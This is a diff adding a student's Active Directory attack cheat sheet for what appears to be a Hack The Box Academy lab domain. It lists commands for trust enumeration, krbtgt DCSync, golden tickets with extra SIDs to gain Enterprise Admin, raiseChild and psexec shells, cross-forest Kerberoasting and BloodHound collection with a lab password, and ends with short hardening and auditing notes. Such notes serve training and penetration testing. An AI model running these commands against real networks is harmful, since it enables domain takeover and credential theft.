@@ -1069,18 +1069,98 @@ Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
 Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 
 # 27 Domain Trusts Primer
+Import-Module activedirectory
+Get-ADTrust -Filter *
+Get-DomainTrust
+Get-DomainTrustMapping
+netdom query /domain:inlanefreight.local trust
+netdom query /domain:inlanefreight.local dc
+netdom query /domain:inlanefreight.local workstation
+
 
 # 28 Attacking Domain Trust Child-Parents Trust from Windows
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtg
+Get-DomainSID
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+ls \\academy-ea-dc01.inlanefreight.local\c$
+mimikatz.exe
+klist
+ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls \\academy-ea-dc01.inlanefreight.local\c$
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+klist
+.\mimikatz
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 
 # 29 Attacking Domain Trust Child-Parents Trust from Linux
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+export KRB5CCNAME=hacker.ccache
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+whoami
+exit
+
+#   The workflow is as follows:
+#       Input:
+#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
+#              The domain specified MUST be the domain FQDN.
+#           2) Optionally a pathname to save the generated golden ticket (-w switch)
+#           3) Optionally a target-user RID to get credentials (-targetRID switch)
+#              Administrator by default.
+#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
+#              Enterprise Admin by default.
+#
+#       Process:
+#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
+#           2) Find out what the forest FQDN is (via [MS-NRPC])
+#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
+#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
+#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
+#              and setting expiration 10 years from now
+#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
+#           7) If file was specified, save the golden ticket in ccache format
+#           8) If target was specified, a PSEXEC shell is launched
+#
+#       Output:
+#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
+#           2) A golden ticket saved in ccache for future fun and profit
+#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
+#              parameter.
 
 # 30 Attacking Domain Trust Cross orest Trust Abuse from Windows
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+whoami
+ipconfig /all
 
 # 31 Attacking Domain Trust Cross orest Trust Abuse from Linux
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+cat /etc/resolv.conf
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+zip -r ilfreight_bh.zip *.json
+cat /etc/resolv.conf
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
 
 # 32 Hardening Active Directory
+Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
+
 
 # 33 Aditional AD Auditing Techniques
+PingCastle.exe --help
+group3r.exe -f <filepath-name.log>
+.\ADRecon.ps1
+ls
 
 # 34 skills 1
 
